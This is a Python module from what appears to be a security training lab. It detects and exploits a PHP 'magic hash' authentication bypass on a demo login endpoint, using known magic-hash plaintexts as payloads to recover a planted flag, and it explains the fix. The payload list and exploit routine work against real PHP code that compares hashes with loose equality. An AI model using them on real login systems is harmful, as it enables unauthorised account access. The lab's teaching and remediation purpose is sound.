r"""PHP "magic hash" authentication bypass via loose ``==`` on ``md5()`` output.

WHAT IT IS
----------
The demo app exposes a password-check endpoint that, in the real-world PHP it
models, looks like this::

    // POST /php/hash-login   body: {"password": "<p>"}
    $stored = "0e462097431906509019562988736854";   // md5("240610708")
    if (md5($_POST['password']) == $stored) {        // <-- LOOSE  ==  (the bug)
        // authenticated -> hand out the flag
    }

The intended secret is the plaintext whose md5 is ``$stored``. The fatal flaw
is the **loose** ``==`` instead of a strict ``===`` (or a constant-time
``hash_equals``). PHP's ``==`` coerces *both* operands before comparing, and
when **both strings look numeric** it compares them as **numbers**, not as
text. An md5 hexdigest of the form ``0e`` followed by *only digits* -- e.g.
``"0e830400451993494058024219903391"`` -- is a valid numeric string in PHP:
it is read as ``0 x 10^(830400...)`` = **0.0**. So::

    md5("QNKCDZO")  == md5("240610708")
    "0e8304004..."  == "0e4620974..."
       0.0          ==     0.0          ->  TRUE

Both hashes coerce to floating-point **zero**, so PHP declares them equal even
though the strings are completely different and neither plaintext is the
stored secret. ANY plaintext whose md5 happens to be ``0e<all-digits>`` (a
"magic hash") therefore authenticates -- the password check is bypassed
without ever guessing the real password. (The same trap exists for ``sha1`` and
any function compared with ``==``; ``md5`` just has well-known short examples.)

The lab models PHP's ``==`` faithfully in :mod:`weblab.targetapp.php_compat`
(``php_loose_equals``): two numeric-looking strings are compared as numbers, so
the ``0e... == 0e...`` coercion fires exactly as on a PHP 5/7 (and still many
PHP 8 ``==``-comparing) server. The planted prize is
:data:`C.FLAGS["magic_hashes"]`.

HOW WE DISCOVER IT
------------------
Two differential signals, contrasting a wrong password with a magic-hash one:

1.  **A wrong, non-magic password is rejected (the control).** ``POST
    /php/hash-login`` with ``{"password": "wrongpw"}`` -- whose md5 is an
    ordinary hex string, not ``0e<digits>`` -- returns HTTP **403**
    (``"denied"``) and no flag. Proof the endpoint really does check the
    password (it is not an open door).

2.  **A magic-hash password is accepted (the exploit signal).** ``POST
    /php/hash-login`` with ``{"password": "QNKCDZO"}`` returns HTTP **200**
    (``"authenticated"``) and the flag -- even though ``"QNKCDZO"`` is NOT the
    stored secret. Acceptance of a non-secret password whose md5 is
    ``0e<digits>`` is the bypass: ``0e...`` loose-equals ``0e...`` as numeric
    zero. We additionally verify, locally, that our payload's md5 is indeed a
    ``0e<digits>`` magic hash AND differs from the stored hash -- so the win is
    a coercion bypass, not us having simply guessed the password.

HOW WE EXPLOIT IT
-----------------
For each candidate in :data:`C.FLAGS`-independent :data:`PAYLOADS` (the known
magic-hash plaintexts ``QNKCDZO``, ``240610708``, ``aabg7XSs`` ... ), we POST
it as the password and scrape the flag from a ``200``/``authenticated``
response. We report every magic plaintext that authenticated and recover the
flag from the first that worked, recording each payload's md5 to make the
``0e<digits>`` coercion visible in the evidence.

THE FIX
-------
See :data:`REMEDIATION`. In one line: compare hashes with a strict,
type-safe, constant-time check (``hash_equals()`` / ``===``), never ``==``;
and don't store/compare raw ``md5``/``sha1`` for credentials at all -- use a
salted, slow password hash (``password_hash`` / bcrypt / Argon2) and verify
with ``password_verify``.
"""
from __future__ import annotations

import hashlib
import re
from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Never compare security-sensitive values (password hashes, HMACs, tokens, "
    "API keys) with PHP's loose '==' -- it type-juggles its operands, and two "
    "numeric-looking strings are compared as NUMBERS, so any two 'magic' hashes "
    "of the form 0e<all-digits> both coerce to the float 0.0 and loose-equal "
    "each other (the magic-hash bug). Concretely: (1) use a STRICT, type-safe "
    "comparison -- '===' in PHP -- which also checks type and so treats the "
    "hashes as the distinct strings they are; better still use hash_equals() "
    "(or password_verify) for a CONSTANT-TIME compare that also resists timing "
    "side-channels. (2) Do NOT authenticate by comparing raw md5()/sha1() of a "
    "password at all: md5/sha1 are fast, unsalted, and collision-/magic-hash- "
    "prone. Store credentials with a salted, deliberately-slow password hash -- "
    "password_hash($pw, PASSWORD_DEFAULT) (bcrypt/Argon2id) -- and verify with "
    "password_verify($pw, $stored), which is type-safe and constant-time by "
    "construction. (3) If you must compare digests (e.g. webhook signatures), "
    "compare the RAW BINARY (hash(..., true)) or wrap the hex in hash_equals() "
    "so the numeric-string coercion can never apply, and reject non-string or "
    "array input. The same trap exists in any language/database that does "
    "implicit numeric coercion on '=='; the universal rule is: compare secrets "
    "as opaque bytes with a strict, constant-time equality, never with a loose "
    "or type-coercing operator."
)

#: The vulnerable endpoint, shown in reports.
ENDPOINT: str = "/php/hash-login"

#: HTTP method + body shape the sink expects: JSON ``{"password": <p>}``.
HTTP_METHOD: str = "POST"

#: A wrong, NON-magic password used as the detection control. Its md5 is an
#: ordinary hex string (not ``0e<digits>``), so a correct strict check rejects it.
CONTROL_WRONG_PASSWORD: str = "wrongpw"

#: The magic-hash plaintexts we submit as the password. Each one's md5 is
#: ``0e<all-digits>``, so under PHP loose '==' it numeric-coerces to 0.0 and
#: loose-equals the stored 0e-hash -- authenticating without the real secret.
#: Sourced from the lab's curated list (kept here so PAYLOADS is self-describing).
PAYLOADS: List[str] = list(C.MAGIC_HASH_ATTACK_PLAINTEXTS)


# --- md5 / magic-hash helpers (local, for evidence + sanity checks) ----------
def _md5_hex(value: str) -> str:
    """``md5()`` hexdigest of ``value`` -- the same digest the server compares."""
    return hashlib.md5(value.encode()).hexdigest()


def is_magic_md5(value: str) -> bool:
    """True if ``md5(value)`` is a "magic" hash: ``0e`` followed by ONLY digits.

    Such a digest is a numeric string in PHP and coerces to the float ``0.0``,
    so under loose ``==`` it equals every other ``0e<digits>`` hash.
    """
    return bool(re.fullmatch(r"0[eE]\d+", _md5_hex(value)))


#: The plaintext the server actually stored (its md5 is the stored 0e-hash). We
#: use it only to PROVE our winning payloads are a *different* plaintext, so the
#: bypass is genuine coercion -- not us submitting the real password.
STORED_PLAINTEXT: str = C.MAGIC_HASH_PLAINTEXT
STORED_HASH: str = _md5_hex(STORED_PLAINTEXT)


# --- low-level probe ---------------------------------------------------------
def _attempt(client: WebClient, password: str) -> Response:
    """Drive the sink once: ``POST /php/hash-login`` with ``{"password": ...}``."""
    return client.post(ENDPOINT, json={"password": password})


def _authenticated(resp: Response) -> bool:
    """True if the response is a successful auth carrying the planted flag."""
    if resp.status != 200:
        return False
    if C.FLAGS["magic_hashes"] not in resp.text:
        return False
    try:
        body = resp.json()
    except ValueError:
        return True  # flag present even if body is not strict JSON
    return isinstance(body, dict) and body.get("status") == "authenticated"


def _flag_from(resp: Response) -> Optional[str]:
    """Extract the planted flag from a successful-auth response, else ``None``."""
    if _authenticated(resp):
        return C.FLAGS["magic_hashes"]
    return None


# --- detection ---------------------------------------------------------------
def detect_wrong_password_rejected(
    client: WebClient, password: str = CONTROL_WRONG_PASSWORD
) -> Tuple[bool, str]:
    """Control: a wrong, NON-magic password is rejected (HTTP 403), no flag.

    Proves the endpoint genuinely checks the password -- so authenticating with
    a magic-hash plaintext later is a *bypass*, not an unguarded door. We also
    assert locally that this control password's md5 is NOT a magic hash, so it
    is a fair control.
    """
    resp = _attempt(client, password)
    fair_control = not is_magic_md5(password)
    if fair_control and resp.status == 403 and C.FLAGS["magic_hashes"] not in resp.text:
        return True, (
            f"POST {ENDPOINT} password={password!r} (md5 {_md5_hex(password)} -- "
            f"an ordinary hex digest, not 0e<digits>) was rejected (HTTP "
            f"{resp.status}, no flag) -- the endpoint really checks the password"
        )
    return False, ""


def detect_magic_hash_bypass(
    client: WebClient,
) -> Tuple[bool, List[Tuple[str, str]], str]:
    """Exploit signal: a magic-hash plaintext authenticates without the secret.

    For each payload in :data:`PAYLOADS` whose md5 is ``0e<digits>`` (verified
    locally) AND which is a *different* plaintext from the stored secret, POST
    it as the password and check for a ``200``/``authenticated``+flag response.
    Returns ``(any_worked, working, evidence)`` where ``working`` is a list of
    ``(plaintext, md5)`` pairs that bypassed auth.
    """
    working: List[Tuple[str, str]] = []
    for password in PAYLOADS:
        h = _md5_hex(password)
        # Only count it as a *magic-hash bypass* if md5 is 0e<digits>. (A
        # payload that simply equalled the stored plaintext would not prove the
        # coercion bug, so we still want it to be a genuine 0e-hash.)
        if not is_magic_md5(password):
            continue
        if _flag_from(_attempt(client, password)) == C.FLAGS["magic_hashes"]:
            working.append((password, h))
    if working:
        # A payload whose plaintext differs from the stored secret proves it is
        # the 0e==0e coercion, not a lucky password guess.
        distinct = [p for p, _h in working if p != STORED_PLAINTEXT]
        forms = ", ".join(f"{p!r} (md5 {h})" for p, h in working)
        evidence = (
            f"{len(working)}/{len([p for p in PAYLOADS if is_magic_md5(p)])} magic-"
            f"hash plaintexts authenticated via {HTTP_METHOD} {ENDPOINT}: {forms}. "
            f"Each md5 is 0e<digits>, which PHP loose '==' coerces to 0.0, so it "
            f"loose-equals the stored hash {STORED_HASH} (md5 of {STORED_PLAINTEXT!r}). "
            + (
                f"{len(distinct)} of these ({', '.join(repr(p) for p in distinct)}) "
                f"are NOT the stored secret -- a pure 0e==0e coercion bypass."
                if distinct
                else ""
            )
        )
        return True, working, evidence
    return False, [], ""


# --- exploitation ------------------------------------------------------------
def exploit_magic_hash(
    client: WebClient,
) -> Tuple[bool, Optional[str], List[Dict[str, str]], str]:
    """Submit each magic-hash plaintext as the password; recover the flag.

    Returns ``(ok, flag, attempts, winning_password)`` where ``attempts`` logs
    every payload tried with its md5 and auth status (for the report), and
    ``winning_password`` is the first plaintext that bypassed auth.
    """
    attempts: List[Dict[str, str]] = []
    flag: Optional[str] = None
    winning: str = ""
    for password in PAYLOADS:
        resp = _attempt(client, password)
        got = _flag_from(resp)
        authed = got == C.FLAGS["magic_hashes"]
        if authed and flag is None:
            flag = got
            winning = password
        attempts.append(
            {
                "password": password,
                "md5": _md5_hex(password),
                "is_magic": str(is_magic_md5(password)),
                "is_stored_plaintext": str(password == STORED_PLAINTEXT),
                "status": str(resp.status),
                "authenticated": str(authed),
            }
        )
    ok = flag == C.FLAGS["magic_hashes"]
    return ok, flag, attempts, winning


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect the PHP magic-hash auth bypass, then exploit it (recover the flag).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["magic_hashes"]`` and the winning magic-hash plaintext(s), with
    ``extra`` proving the bypass is real: a wrong non-magic password is 403, yet
    a magic-hash plaintext (md5 = 0e<digits>) that is NOT the stored secret
    authenticates because PHP loose '==' coerces both 0e-hashes to numeric 0.0.
    """
    techniques: List[str] = []

    # 1) Detection / control ------------------------------------------------
    control_ok, control_ev = detect_wrong_password_rejected(client)
    if control_ok:
        techniques.append("wrong-password-rejected-403")
    bypass_ok, working, bypass_ev = detect_magic_hash_bypass(client)
    if bypass_ok:
        techniques.append("magic-hash-bypass-200")

    # 2) Exploitation -------------------------------------------------------
    ok, flag, attempts, winning = exploit_magic_hash(client)
    if ok:
        techniques.append("recover-flag")

    # Discovery requires BOTH: the control proves the password is really checked,
    # and a magic-hash plaintext (md5 0e<digits>, not the stored secret) wins.
    working_plaintexts = [p for p, _h in working]
    distinct_plaintexts = [p for p in working_plaintexts if p != STORED_PLAINTEXT]
    discovered = bool(control_ok and bypass_ok and ok and distinct_plaintexts)

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if control_ok:
        evidence_parts.append(f"control: {control_ev}")
    if bypass_ok:
        evidence_parts.append(f"bypass: {bypass_ev}")
    evidence = " || ".join(evidence_parts)

    winning_md5 = _md5_hex(winning) if winning else ""
    exploit_result = {
        "flag": flag,
        "payload": winning,
        "payload_md5": winning_md5,
        "stored_plaintext": STORED_PLAINTEXT,
        "stored_hash": STORED_HASH,
        "control_password": CONTROL_WRONG_PASSWORD,
        "control_md5": _md5_hex(CONTROL_WRONG_PASSWORD),
        "working_plaintexts": working_plaintexts,
        "distinct_from_secret": distinct_plaintexts,
        "attempts": attempts,
        "techniques": techniques,
        "summary": (
            f"a wrong non-magic password ({CONTROL_WRONG_PASSWORD!r}, md5 "
            f"{_md5_hex(CONTROL_WRONG_PASSWORD)}) was rejected with HTTP 403, but the "
            f"magic-hash plaintext {winning!r} (md5 {winning_md5}) authenticated via "
            f"{HTTP_METHOD} {ENDPOINT}: its md5 is 0e<digits>, which PHP's loose '==' "
            f"coerces to the float 0.0, so 0e... == 0e... ({STORED_HASH}) is TRUE even "
            f"though {winning!r} is not the stored secret {STORED_PLAINTEXT!r}. "
            f"Recovered flag {flag!r} -- a magic-hash authentication bypass"
        ),
    }

    return Finding(
        vuln="PHP Magic Hash (loose == on md5 -> auth bypass)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=winning,
        extra={
            "techniques": techniques,
            "control_rejected": control_ok,
            "control_status": 403,
            "control_password": CONTROL_WRONG_PASSWORD,
            "bypass_authenticated": bypass_ok,
            "flag_recovered": ok,
            "winning_payload": winning,
            "winning_md5": winning_md5,
            "stored_plaintext": STORED_PLAINTEXT,
            "stored_hash": STORED_HASH,
            "working_plaintexts": working_plaintexts,
            "distinct_from_secret": distinct_plaintexts,
            "attempts": attempts,
        },
    )
